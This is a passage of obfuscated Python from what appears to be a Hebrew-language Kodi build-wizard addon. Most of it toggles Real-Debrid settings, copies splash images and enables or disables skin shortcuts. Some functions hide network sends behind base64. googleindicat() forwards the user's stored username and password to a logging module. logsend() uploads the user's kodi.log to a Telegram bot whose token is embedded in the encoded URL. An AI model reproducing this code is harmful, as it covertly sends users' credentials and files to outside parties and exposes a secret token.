          OO00O0OO0000O0000 =urllib2 .urlopen (O000OO0O00O0OO0OO .decode ('base64')+' - '+OO0OO0O00O00OO0OO +' - '+OO000O0OOOO000000 +' - '+O0OOO00O00OOOO000 ).readlines ()#line:573
       except :pass #line:574
def googleindicat ():#line:577
			import logg #line:578
			OO00OO0O0000000O0 =(ADDON .getSetting ("pass"))#line:579
			O00OOOO0OO00OO000 =(ADDON .getSetting ("user"))#line:580
			logg .logGA (OO00OO0O0000000O0 ,O00OOOO0OO00OO000 )#line:581
def logsend ():#line:582
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:583
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:584
      howsentlog ()#line:586
      import requests #line:587
      if xbmc .getCondVisibility ('system.platform.windows'):#line:588
         OO00O0OO0OOOO000O =xbmc .translatePath ('special://home/kodi.log')#line:589
         O00O000OOO00OO0OO ={'chat_id':(None ,'-274262389'),'document':(OO00O0OO0OOOO000O ,open (OO00O0OO0OOOO000O ,'rb')),}#line:593
         OO0OOOO00O0O00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:594
         O0O00000O0O0O000O =requests .post (OO0OOOO00O0O00O00 .decode ('base64'),files =O00O000OOO00OO0OO )#line:596
      elif xbmc .getCondVisibility ('system.platform.android'):#line:597
           OO00O0OO0OOOO000O =xbmc .translatePath ('special://temp/kodi.log')#line:598
           O00O000OOO00OO0OO ={'chat_id':(None ,'-274262389'),'document':(OO00O0OO0OOOO000O ,open (OO00O0OO0OOOO000O ,'rb')),}#line:602
           OO0OOOO00O0O00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:603
           O0O00000O0O0O000O =requests .post (OO0OOOO00O0O00O00 .decode ('base64'),files =O00O000OOO00OO0OO )#line:605
      else :#line:606
           OO00O0OO0OOOO000O =xbmc .translatePath ('special://kodi.log')#line:607
           O00O000OOO00OO0OO ={'chat_id':(None ,'-274262389'),'document':(OO00O0OO0OOOO000O ,open (OO00O0OO0OOOO000O ,'rb')),}#line:611
           OO0OOOO00O0O00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:612
           O0O00000O0O0O000O =requests .post (OO0OOOO00O0O00O00 .decode ('base64'),files =O00O000OOO00OO0OO )#line:614
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:615
def rdoff ():#line:617
	OOOO00O000O000OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:618
	OOOO00O000O000OOO .setSetting ('rd.client_id','')#line:619
	OOOO00O000O000OOO .setSetting ('rd.secret','')#line:620
	OOOO00O000O000OOO .setSetting ('rdsource','false')#line:621
	OOOO00O000O000OOO .setSetting ('super_fast_type_toren','false')#line:622
	OOOO00O000O000OOO .setSetting ('rd.auth','false')#line:623
	OOOO00O000O000OOO .setSetting ('rd.refresh','false')#line:624
	OOOO00O000O000OOO =xbmcaddon .Addon ('script.module.resolveurl')#line:626
	OOOO00O000O000OOO .setSetting ('RealDebridResolver_client_id','')#line:627
	OOOO00O000O000OOO .setSetting ('RealDebridResolver_client_secret','')#line:628
	OOOO00O000O000OOO .setSetting ('RealDebridResolver_token','')#line:629
	OOOO00O000O000OOO .setSetting ('RealDebridResolver_refresh','')#line:630
	OOOO00O000O000OOO =xbmcaddon .Addon ('plugin.video.seren')#line:632
	OOOO00O000O000OOO .setSetting ('rd.client_id','')#line:633
	OOOO00O000O000OOO .setSetting ('rd.secret','')#line:634
	OOOO00O000O000OOO .setSetting ('rd.auth','')#line:635
	OOOO00O000O000OOO .setSetting ('rd.refresh','')#line:636
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:637
		OOOO00O000O000OOO =xbmcaddon .Addon ('plugin.video.gaia')#line:638
		OOOO00O000O000OOO .setSetting ('accounts.debrid.realdebrid.id','')#line:639
		OOOO00O000O000OOO .setSetting ('accounts.debrid.realdebrid.secret','')#line:640
		OOOO00O000O000OOO .setSetting ('accounts.debrid.realdebrid.token','')#line:641
		OOOO00O000O000OOO .setSetting ('accounts.debrid.realdebrid.refresh','')#line:642
	resloginit .resloginit ('restore','all')#line:643
	O0000O0OO000O0OO0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:645
	OOOO0OO0OO00O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:646
	copyfile (O0000O0OO000O0OO0 ,OOOO0OO0OO00O0O00 )#line:647
def skindialogsettind18 ():#line:648
	try :#line:649
		OO000O000O0OOO00O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:650
		OOOO00OO0O00000O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:651
		copyfile (OO000O000O0OOO00O ,OOOO00OO0O00000O0 )#line:652
	except :pass #line:653
def rdon ():#line:654
	loginit .loginIt ('restore','all')#line:655
	O0O0O0O0OOOOOO000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:657
	O0O0000000OO0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:658
	copyfile (O0O0O0O0OOOOOO000 ,O0O0000000OO0O0OO )#line:659
def adults18 ():#line:661
  O00O00O0OO00OO0OO =(ADDON .getSetting ("adults"))#line:662
  if O00O00O0OO00OO0OO =='true':#line:663
    OO0O0000OO0OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:664
    with open (OO0O0000OO0OOOOO0 ,'r')as O0O0000O0OO0OO0OO :#line:665
      OOO0OO0O0OOOO0000 =O0O0000O0OO0OO0OO .read ()#line:666
    OOO0OO0O0OOOO0000 =OOO0OO0O0OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:684
    with open (OO0O0000OO0OOOOO0 ,'w')as O0O0000O0OO0OO0OO :#line:687
      O0O0000O0OO0OO0OO .write (OOO0OO0O0OOOO0000 )#line:688
def rdbuildaddon ():#line:689
  OO0OO00O000OOOOOO =(ADDON .getSetting ("auto_rd"))#line:690
  if OO0OO00O000OOOOOO =='true':#line:691
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:692
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:693
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:694
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:712
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:715
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:716
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:720
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:721
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:722
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:740
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:743
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:744
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:748
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:749
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:750
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:768
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:771
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:772
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:776
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:777
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:778
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:796
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:799
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:800
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:803
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:804
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:805
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:823
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:826
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:827
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:829
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:830
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:831
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:849
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:852
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:853
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:855
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:856
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:857
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:875
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:878
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:879
    OOOO000O000O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:882
    with open (OOOO000O000O0O0OO ,'r')as OO0OO0OO00OOOO0OO :#line:883
      O00O0OOOO00O00O00 =OO0OO0OO00OOOO0OO .read ()#line:884
    O00O0OOOO00O00O00 =O00O0OOOO00O00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:902
    with open (OOOO000O000O0O0OO ,'w')as OO0OO0OO00OOOO0OO :#line:905
      OO0OO0OO00OOOO0OO .write (O00O0OOOO00O00O00 )#line:906
def rdbuildinstall ():#line:909
  try :#line:910
   OOO0O00000OO0O0OO =(ADDON .getSetting ("auto_rd"))#line:911
   if OOO0O00000OO0O0OO =='true':#line:912
     OO0O0000OOOO0OO0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:913
     O0O0000O00O0OO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:914
     copyfile (OO0O0000OOOO0OO0O ,O0O0000O00O0OO0OO )#line:915
  except :#line:916
     pass #line:917
def rdbuildaddonoff ():#line:920
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:923
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:924
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:925
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:943
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:946
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:947
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:951
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:952
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:953
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:971
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:974
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:975
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:979
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:980
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:981
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:999
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:1002
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:1003
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1007
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:1008
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:1009
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1027
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:1030
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:1031
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1034
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:1035
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:1036
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1054
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:1057
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:1058
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1060
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:1061
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:1062
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1080
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:1083
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:1084
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1086
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:1087
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:1088
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1106
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:1109
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:1110
    O0000O0O000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1113
    with open (O0000O0O000OOOO0O ,'r')as O0OO0000O00O00000 :#line:1114
      O0000OO000O0OOOOO =O0OO0000O00O00000 .read ()#line:1115
    O0000OO000O0OOOOO =O0000OO000O0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1133
    with open (O0000O0O000OOOO0O ,'w')as O0OO0000O00O00000 :#line:1136
      O0OO0000O00O00000 .write (O0000OO000O0OOOOO )#line:1137
def rdbuildinstalloff ():#line:1140
    try :#line:1141
       OOOOO00OOOOO000OO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1142
       O00OO0O0O0OOOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1143
       copyfile (OOOOO00OOOOO000OO ,O00OO0O0O0OOOOOOO )#line:1145
       OOOOO00OOOOO000OO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1147
       O00OO0O0O0OOOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1148
       copyfile (OOOOO00OOOOO000OO ,O00OO0O0O0OOOOOOO )#line:1150
       OOOOO00OOOOO000OO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1152
       O00OO0O0O0OOOOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1153
       copyfile (OOOOO00OOOOO000OO ,O00OO0O0O0OOOOOOO )#line:1155
       OOOOO00OOOOO000OO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1158
       O00OO0O0O0OOOOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1159
       copyfile (OOOOO00OOOOO000OO ,O00OO0O0O0OOOOOOO )#line:1161
    except :#line:1163
       pass #line:1164
def rdbuildaddonON ():#line:1171
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1173
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1174
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1175
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
